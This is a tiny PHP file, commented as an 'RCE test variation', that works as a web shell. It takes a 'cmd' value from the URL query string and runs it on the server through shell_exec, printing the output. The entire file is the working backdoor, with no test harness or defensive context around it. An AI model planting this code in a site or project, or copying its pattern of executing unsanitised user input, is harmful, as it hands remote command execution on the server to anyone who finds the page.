<?php
// RCE test variation #964
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>